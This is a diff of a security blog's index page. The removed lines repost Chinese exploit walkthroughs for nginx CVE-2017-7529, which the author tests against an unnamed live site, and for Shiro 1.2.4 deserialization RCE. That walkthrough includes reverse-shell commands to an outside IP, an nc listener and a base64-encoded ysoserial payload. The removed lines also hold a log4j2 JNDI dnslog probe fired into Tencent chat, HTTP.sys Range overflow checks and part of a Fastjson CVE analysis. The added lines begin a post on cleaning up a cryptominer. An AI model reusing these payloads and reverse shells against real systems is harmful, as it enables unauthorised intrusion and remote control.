-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoliu66007/p/10174672.html">https://www.cnblogs.com/xiaoliu66007/p/10174672.html</a></li>
-<li><a target="_blank" rel="noopener" href="https://forum.huawei.com/enterprise/zh/thread-293945.html">https://forum.huawei.com/enterprise/zh/thread-293945.html</a></li>
-</ul>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/DOS/" rel="tag">DOS</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/08/CVE-2017-7529-Nginx/">
-                CVE-2017-7529-Nginx
-            </a>
-        </h2>
-    
-    <time>
-        Aug 8, 2022
-    </time>
-    <section class="content">
-        <h1><span id="nginx-整数溢出小结-cve-2017-7529">nginx 整数溢出小结 cve-2017-7529</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/gaogaogaopipi/article/details/90301358">gaogaogaopipi</a></p>
-</blockquote>
-<h2><span id="起因">起因</span></h2><blockquote>
-<p>这两天在做nginx整数溢出时出了点小岔子，经过学习对这个问题有了深入的了解，特此记录。</p>
-<p>漏洞补丁以及平安银河实验室已经把这事说的很清楚了，在此记录<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/terminal/140402.html">原文地址</a></p>
-<p>简单的说就是这么一回事：<br>HTTP的Range允许客户端分批次请求资源的一部分，如果服务端资源较大，可以通过Range来并发下载；<br>正常情况下组件代码中计算了Range的长度，防止溢出，可以构造恶意长度来绕过，从而读取缓存的头部数据，造成泄露。</p>
-<p>细节要留意的就是range的相关定义，示例如下<br>Range:bytes&#x3D;0-1024 表示访问第0到第1024字节；<br>Range:bytes&#x3D;500-600,601-999，-300 表示分三块访问，分别是500到600字节，601到600字节，最后的300字节；</p>
-<p>在Response头中设置:<br>Accept-Ranges:bytes 表示接受部分资源的请求；<br>Content-Range: bytes START-END&#x2F;SIZE 表示返回的资源位置；其中SIZE等于Content-Length;如：Content-Range: bytes 500-600&#x2F;1000</p>
-</blockquote>
-<h2><span id="经过">经过</span></h2><blockquote>
-<p>测试站点：www.（我肯定是不能明说）.com.cn</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/1.png" alt="image"></p>
-<p>以站点的一张图片为例子，路径：&#x2F;images&#x2F;sq.jpg</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/2.png" alt="image"></p>
-<p>上图可以看到正常情况下content-length的大小是8935bytes，也就是size的大小。<br>size大小就是我一开始搞混了的地方，清楚了size的大小那么根据平安银河实验室的文章就有如下过程：</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/3.png" alt="image"></p>
-<p>上图可以看到正常的返回数据以及完整的ranges长度返回。</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/4.png" alt="image"></p>
-<p>上图可以看到，选择返回后十个bytes得到的结果（8935-10&#x3D;8925，所以是从8925开始返回。因为写定的end是总长减一，所以结尾的值是8934，所以此处statr&#x3D;8925,end&#x3D;8934），以及返回的range的位置。</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/5.png" alt="image"></p>
-<p>上图是对上面的补充，可以看到在读取部分bytes时，完整的参数是从“多少”到“多少”，上面是从1到10</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/6.png" alt="image"></p>
-<p>上图可以看到，在使用完整的输入模式，对-1开始读取的时候，触发了<code>ngx_http_range_parse()</code><br>对statr的负值检查，所以报错，无法读取。<br>那么此时就如原文所说<br>因此，如果需要将start解析为负数，只能通过-end这类后缀型range参数实现</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/7.png" alt="image"></p>
-<p>如上图，使用 -end 只设置一个大于8935的值，此时statr &#x3D; 8935-9000 &#x3D; -65，满足了负值。但按上文所说，statr是负值则会报错。<br>注意到此时并未报错，而是正常返回，原因是此处设置的range不是完整模式，虽然是负值，但是因为end的默认值是总长-1（8935-1&#x3D;8934），那么此时这段要读取的range的范围是从 -65到 8934 其实际总长超过了 8935 所以nginx丢弃了range，所以正常返回。</p>
-</blockquote>
-<h2><span id="重点">重点</span></h2><blockquote>
-<p>上面满足了传值为负值的条件，但是因为总长度检测的原因，导致丢弃range，那么如果绕过总长度检测？为什么这个漏洞要叫 整数溢出 漏洞呢？<br>这里注意到 ***start, end, size均为64位有符号整形，值的范围是-9223372036854775808 … 9223372036854775807 ，那么根据补丁中的代码 size +&#x3D; end - start</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/8.png" alt="image"></p>
-<p>只要最终size的值是负值，即可溢出，从而绕过检测，所以叫 整数溢出<br>0x8000 0000 0000 0000既是64位有符号型的最小负值，所以只需要最终相加得到的size为0×8000000000000000即可。</p>
-<p>注意 size +&#x3D; end -start;这等于如果存在多个range，那么就会有 size &#x3D; size + (end - start)<br>也就是说在有多个range时，最终的size &#x3D; size1 + size2 + … +sizeN<br>如上所说，只要size是负值即可溢出，那么就能得到第二个range的值，若第一个range是9500<br>那么0x8000000000000000-9500 既是第二个值</p>
-<p>那么如下图：</p>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/9.png" alt="image"></p>
-<p>成功！</p>
-</blockquote>
-<h2><span id="结果">结果</span></h2><blockquote>
-<p><img src="/2022/08/08/CVE-2017-7529-Nginx/10.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/08/Shiro-RememberMe-1-2-4/">
-                Shiro RememberMe 1.2.4
-            </a>
-        </h2>
-    
-    <time>
-        Aug 8, 2022
-    </time>
-    <section class="content">
-        <h1><span id="shiro-rememberme-124-反序列化命令执行漏洞复现-kali-docker">Shiro RememberMe 1.2.4 反序列化命令执行漏洞复现 kali docker</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44067239/article/details/106918315">莫憨憨</a></p>
-</blockquote>
-<h3><span id="影响版本apache-shiro-ltx3d-124">影响版本：Apache Shiro &lt;&#x3D; 1.2.4</span></h3><h2><span id="漏洞产生原因">漏洞产生原因:</span></h2><blockquote>
-<p>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。<br>然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。使用大佬脚本生成 payload(ysoserial.jar文件和运行目录处于同一目录)</p>
-</blockquote>
-<h2><span id="漏洞环境搭建">漏洞环境搭建</span></h2><h3><span id="1拉取镜像">1.拉取镜像</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
-
-<h3><span id="2启动环境">2.启动环境</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:8080 -p 7777:6666 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>如需进入环境，命令为</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it name /bin/bash</span><br></pre></td></tr></table></figure>
-
-<h3><span id="3web访问">3.web访问</span></h3><blockquote>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a> 能看到如下页面即可</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/1.png" alt="image"></p>
-<p>或虚拟机外面用真实ip访问</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/2.png" alt="image"></p>
-<p>至此漏洞环境搭建成功</p>
-</blockquote>
-<h2><span id="漏洞复现">漏洞复现</span></h2><h3><span id="1抓包测试">1.抓包测试</span></h3><blockquote>
-<p>查看返回包里setcookie有rememberme的字样</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/3.png" alt="image"></p>
-</blockquote>
-<h3><span id="2继续测试">2.继续测试</span></h3><blockquote>
-<p>首先最简单的测试方法是用dnslog，看看是否有回显。<br>利用POC生成想要执行的命令对应的rememberMe</p>
-</blockquote>
-<h3><span id="3工具准备">3.工具准备</span></h3><blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/4.png" alt="image"></p>
-<p>生成payload的脚本使用的是python3,运行报错就安装一下模块</p>
-</blockquote>
-<h3><span id="4生成payload">4.生成payload：</span></h3><blockquote>
-<p>双引号中是想要执行的命令，如果这里没有公网VPS，就用dnslog来证明。攻击原理一样，不认可的杠精可直接怼</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;ping 39p2wo.dnslog.cn&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>运行结果如下图：</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/5.png" alt="image"></p>
-<p>然后便会在脚本所在目录下生成文件payload.cookie</p>
-</blockquote>
-<h3><span id="5回到浏览器抓包">5.回到浏览器抓包</span></h3><blockquote>
-<p>用payload.cookie中的rememberMe内容加入Cookie中，或者直接放进参数中，提交看页面回显和dnslog页面是否有数据过去</p>
-</blockquote>
-<h3><span id="6到ceye平台查看日志记录">6.到ceye平台查看日志记录</span></h3><blockquote>
-<p>dnslog日志刷新后有记录了，说明payloda执行成功</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/6.png" alt="image"></p>
-</blockquote>
-<h2><span id="反弹shell">反弹shell</span></h2><blockquote>
-<p>当然了，有VPS的情况下，为何不反弹一下shell呢？</p>
-</blockquote>
-<h3><span id="1使用脚本生成key">1.使用脚本生成key</span></h3><blockquote>
-<p>反弹shell的命令：<code>bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1</code></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>PS：ip假的，不打码，观看流畅</p>
-</blockquote>
-<h3><span id="2先公网vps监听反弹shell的命令">2.先公网VPS监听反弹shell的命令</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7878</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/7.png" alt="image"></p>
-</blockquote>
-<h3><span id="3加入payload提交数据包">3.加入payload，提交数据包</span></h3><blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/8.png" alt="image"></p>
-<p>这里使用curl也能达到burp的效果</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 加 -I 是只看响应头，这里主要关注set-cookie:rememberMe</span><br><span class="line">curl -X GET http://172.16.12.132 --cookie “xxxxxxxxxxxxx” -I</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>讲这个是因为此方法可以用来初步探测shiro信息</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/9.png" alt="image"></p>
-</blockquote>
-<h3><span id="4vps收到了反弹回来的shell">4.vps收到了反弹回来的shell</span></h3><blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/10.png" alt="image"></p>
-</blockquote>
-<h2><span id="题外话1">题外话1</span></h2><blockquote>
-<p>研究这个漏洞，是因为客户要求排查下资产，然后找不到集成的工具和一键式检查的。<br>漏洞的事情OK了，还是觉得自己太菜，要是代码够给力，写个集成的丢github上就真的香。</p>
-</blockquote>
-<h2><span id="题外话2">题外话2</span></h2><blockquote>
-<p>还有一个思路，看大佬文章时，这里一直没搞懂。字面意思是用ysoserial中的JRMP监听模块来搞定的，后续学会了再补上笔记</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 3888 CommonsCollections5 <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/11.png" alt="image"></p>
-</blockquote>
-<h2><span id="参考链接">参考链接：</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0007eafd1f92">https://www.jianshu.com/p/0007eafd1f92</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/112742.html">https://www.secpulse.com/archives/112742.html</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Shiro/" rel="tag">Shiro</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/03/dnslog-log4j2/">
-                dnslog-log4j2
-            </a>
-        </h2>
-    
-    <time>
-        Aug 3, 2022
-    </time>
-    <section class="content">
-        <h1><span id="dnslog简单验证log4j2漏洞">dnslog简单验证log4j2漏洞</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://xingye.me/?p=444">星夜</a></p>
-</blockquote>
-<h2><span id="简单步骤">简单步骤</span></h2><blockquote>
-<p>进dnslog：<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p>
-<p>Get SubDomain 得到一个随机的子域名</p>
-<p>拼进${jndi:ldap:&#x2F;&#x2F;xxxxx.dnslog.cn&#x2F;exp}</p>
-<p>往任意可能在log中塞的输入填</p>
-<p>这里拿tx玩，如群中发送，可得到tx云的记录</p>
-<p><img src="/2022/08/03/dnslog-log4j2/1.png" alt="image"></p>
-<p><img src="/2022/08/03/dnslog-log4j2/2.png" alt="image"></p>
-<p><img src="/2022/08/03/dnslog-log4j2/3.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Log4j2/" rel="tag">Log4j2</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/03/HTTP.sys%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
-                HTTP.sys远程代码执行
-            </a>
-        </h2>
-    
-    <time>
-        Aug 3, 2022
-    </time>
-    <section class="content">
-        <h1><span id="渗透整理httpsys远程代码执行">【渗透整理】HTTP.sys远程代码执行</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42742658/article/details/106548456">久违 °</a></p>
-</blockquote>
-<h2><span id="漏洞介绍">漏洞介绍</span></h2><blockquote>
-<p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞，当攻击者向受影响的Windows系统发送特殊设计的HTTP 请求，HTTP.sys 未正确分析时就会导致此漏洞，成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</p>
-<p>影响环境：Windows+IIS的环境下，任何安装了微软IIS 6.0以上的Windows Server 2008 R2&#x2F;Server 2012&#x2F;Server 2012 R2以及Windows 7&#x2F;8&#x2F;8.1操作系统都受到这个漏洞的影响。</p>
-</blockquote>
-<h2><span id="漏洞知识">漏洞知识</span></h2><blockquote>
-<p>说到HTTP.sys远程代码执行漏洞，不得不先介绍一下Range首部字段。</p>
-<p>在“上古时代”，网络并不是很好，下载大型文件很不容易。下载途中如果网络中断，就得重头开始下。为了解决这个问题，HTTP&#x2F;1.1引入了范围请求。</p>
-<p>在请求报文的Range首部字段中指定资源的byte范围，告诉服务器，请求的是资源哪个范围的内容，让断点续传和并行下载得以实现。</p>
-<p>如果服务器支持范围请求，响应包中就会存在Accept-Ranges字段(且值不为“none”，bytes为资源范围的单位)，并在Content-Length字段中告诉客户端资源的大小范围。</p>
-<p><img src="/2022/08/03/HTTP.sys%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.png" alt="image"></p>
-<p>如果没有Accept-Ranges字段，则服务器可能不支持范围请求，有的服务器会明确将值设为“none”。</p>
-<p>服务器面对范围请求，有三种响应：</p>
-<p>请求成功：</p>
-<p>响应206Partial Content请求范围越界：（范围超过资源的大小）</p>
-<p>响应416Requested Range Not Satisfiable不支持范围请求：</p>
-<p>响应200OK</p>
-<p>而HTTP.sys远程代码执行漏洞正是利用Range字段注入恶意数据。该漏洞的检测，也是利用服务器面对范围请求时的响应特征来判断。</p>
-</blockquote>
-<h2><span id="漏洞检测方法">漏洞检测方法</span></h2><blockquote>
-<p>1、先判断目标环境是否为Windows+IIS</p>
-<p>2、然后构建Range字段进行检测即可</p>
-<p>检测时，在请求包中添加Range字段，如下：</p>
-<p><code>Range: bytes=0-18446744073709551615</code></p>
-<p>【18446744073709551615的十六进制为0xFFFFFFFFFFFFFFFF(16个F)是64位无符号整数所能表达的最大整数，整数溢出和这个超大整数有关】</p>
-<p>然后go给服务器</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: stuff</span><br><span class="line">Range: <span class="built_in">bytes</span>=<span class="number">0</span>-<span class="number">18446744073709551615</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>或者：</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v www.test.com -H <span class="string">&quot;Host: irrelevant&quot;</span> -H <span class="string">&quot;Range: bytes=0-18446744073709551615&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>服务器响应 400，证明不存在HTTP.sys远程代码执行漏洞</p>
-<p><code>HTTP Error 400. The request has an invalid header name.</code></p>
-<p>服务器响应 416，则证明存在该漏洞</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">416</span> Requested Range Not Satisfiable</span><br><span class="line">Content-<span class="type">Type</span>: text/html</span><br><span class="line">Last-Modified: Thu, <span class="number">22</span> Aug <span class="number">2013</span> <span class="number">23</span>:<span class="number">53</span>:<span class="number">12</span> GMT</span><br><span class="line">Accept-Ranges: <span class="built_in">bytes</span></span><br><span class="line">ETag: <span class="string">&quot;2edebc2929fce1:0&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2><span id="漏洞修复建议">漏洞修复建议：</span></h2><blockquote>
-<p>升级安全补丁</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/03/CVE-2022-25845-Fastjson/">
-                CVE-2022-25845 – Fastjson
-            </a>
-        </h2>
-    
-    <time>
-        Aug 3, 2022
-    </time>
-    <section class="content">
-        <h1><span id="cve-2022-25845-fastjson-auto-type-bypass-rce漏洞分析">CVE-2022-25845 – Fastjson “Auto Type Bypass” RCE漏洞分析</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d4702da8b93e?u_atoken=e8be5a2e-d2f2-40e8-9032-eb762ac70e4d&u_asession=016gAHNAGW5kwEmr9SHcziNNztkuT3HPV9Qi1BUpHrLJq9hEVlxH_k1w9FiGt4iz1TX0KNBwm7Lovlpxjd_P_q4JsKWYrT3W_NKPr8w6oU7K_nesHWq-uvzShryNdruwb_Ppcarp92QKzyJKyYjREPlmBkFo3NEHBv0PZUm6pbxQU&u_asig=0571xFqT6ytNlYS2FmxKjAUaC7IIZzHH_wNoBkl0fuXB7L7i_BKRMiYdR7WkEyOH04jON-Y6ZkqCQaLBYWgAvEfdDsRAMInmkstRXd3gA_02JitfEM0sXqs1ygakF_Gssvi8K917w5adBQOQPWp0fT6NXrc-haXIlf4ev16Nwyo_H9JS7q8ZD7Xtz2Ly-b0kmuyAKRFSVJkkdwVUnyHAIJze09tESGin2xLknH8nQ1NfDH10X8edffiTaObeVvRyl4WPRPQyB_SKrj-61LB_f61u3h9VXwMyh6PgyDIVSG1W88Y2fYLRHbT4ia04fxhHA1ybLonYZfH1eNUN_6rAKYnOe2A-SmkXiAo5UbaV32iFMBBLacmUFwtytO_4ZvRIY1mWspDxyAEEo4kbsryBKb9Q&u_aref=ErhmyQTxFTESTC8Ph/fkOki3fC0=">vayci</a></p>
+        <h1><span id="服务器linux挖矿木马病毒kswapd0进程使cpu爆满">服务器（Linux）挖矿木马病毒（kswapd0进程使cpu爆满）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_47831505/article/details/123939089">飞川撸码</a> 并作补充</p>
 </blockquote>
 <h2><span id="前言">前言</span></h2><blockquote>
-<p>几周前， Fastjson 发布了一个新版本 (1.2.83) ，其中包含一项安全漏洞修复。据称攻击者可以利用此漏洞在远程机器上执行代码。根据发布的多篇文章，攻击者通过漏洞可以绕过Fastjson中的“AutoTypeCheck”机制，完成远程代码执行。</p>
-<p>这个 Fastjson 漏洞最近才收到一个 CVE 漏洞标识符 – CVE-2022-25845，以及高达8.1的CVSS漏洞评分。尽管如此，这个漏洞仍扑朔迷离。尽管这是被宣称为在无处不在的组件中存在的一个高危RCE漏洞（将近5000个Maven项目都存在Fastjson依赖！），却几乎没有任何关于它的公开技术细节。到底是哪里存在漏洞，又是在什么条件下容易被攻击？</p>
-<p>在本篇文章中，我们深入研究了这个Fastjson漏洞的严重性，以及那些类型的Java应用程序受此影响。文末是给目前无法升级到指定Fastjson版本的开发人员的一些策略建议。</p>
+<p>由于本人的阿里云服务器遭受攻击，被挖矿，导致CPU爆满，同时受到阿里云官方的邮箱、短信以及电话通知（监管部门是不允许服务器被直接或者间接挖矿）<br>首先是CPU爆满，远程登录不了，通过将服务器重启以后可以远程登录了。以kswapd0进程为例，其他进程类似，下面就是具体步骤了。<br>可参考阿里云的：挖矿程序处理最佳实践<br>注：如果你的服务器购买了付费版云安全中心，在云安全中心插件正常的前提下，可以利用付费版的主动防御及安全告警处理的功能来手动扫描下，对于检测到的威胁，你可以在安全告警处理页面进一步核实处理。应该可以直接处理掉。(如果没有，看下面的处理)<br><img src="/2023/10/25/kswapd0-CPU-1/1.png" alt="image"> </p>
+<p><img src="/2023/10/25/kswapd0-CPU-1/2.png" alt="image"> </p>
 </blockquote>
-<h2><span id="哪些情况会受到cve-2022-25845漏洞的影响">哪些情况会受到CVE-2022-25845漏洞的影响？</span></h2><blockquote>
-<p>所有依赖 Fastjson 版本 1.2.80 或更早版本的程序，在应用程序中如果包含使用用户数据调用 JSON.parse 或 JSON.parseObject 方法，但不指定要反序列化的特定类，都会受此漏洞的影响。</p>
-<p><img src="/2022/08/03/CVE-2022-25845-Fastjson/1.png" alt="image" title="存在潜在风险的API和安全API的不完全示例"></p>
-<p>虽然看起来很宽泛，但是我们可以发现，在这些前提条件下，攻击者也只能通过这个漏洞调用特定类型的Java反序列化gadget（继承Throwable类的gadget类），这大大限制了这个漏洞的实际影响。</p>
+<h2><span id="1在系统里面top一下查看了所有进程">1.在系统里面top一下，查看了所有进程</span></h2><blockquote>
+<p><img src="/2023/10/25/kswapd0-CPU-1/3.png" alt="image"> </p>
+<p>看到这些进程一直在变化，但是，主要是由于kswapd0进程在作怪，占据了99%以上的CUP，查找资料后，发现它就是挖矿进程。</p>
 </blockquote>
-<h2><span id="技术深入探究">技术深入探究</span></h2><blockquote>
-<p>Fastjson 是一个 Java 库，可以将 Java 对象序列化和反序列化，实现Java对象和JSON的相互转换。</p>
-<p>和大多数 JSON 类一样，Fastjson 支持将基本 JSON 类型（数组和对象）分别序列化和反序列化为它们的 Java 等价对象——Arrays 和 Maps。</p>
-<p>然而，Fastjson也可以将用户的Java对象（POJO）序列化为JSON，或从JSON反序列化为Java对象。</p>
-<p>例如，我们定义了一个名为User的类，以下代码时将其进行序列化为JSON，然后再进行反序列化。</p>
+<h2><span id="2排查kswapd0进程">2.排查kswapd0进程</span></h2><h3><span id="21-执行命令netstat-antlp-grep-kswapd0-查询该进程的网络信息">2.1 执行命令netstat -antlp | grep kswapd0 查询该进程的网络信息</span></h3><blockquote>
+<p><code>netstat -antlp | grep kswapd0</code><br><img src="/2023/10/25/kswapd0-CPU-1/4.png" alt="image"> </p>
 </blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">  <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line">  <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> JSON.parseObject(jsonString, User.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <blockquote>
-<p>JSON.parseObject()返回一个 JSONObject 对象， 然后这个对象又转换为User类。</p>
-<p>有时候，开发人员想要更灵活的代码来接收序列化的JSON，告诉代码JSON应该被反序列化为哪种类。例如下面这种JSON形式：</p>
+<p>发现一个与本机端口通信的是一个荷兰的ip<br><img src="/2023/10/25/kswapd0-CPU-1/5.png" alt="image"> </p>
 </blockquote>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="attr">&quot;users&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AdminUser&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GuestUser&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;guest&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
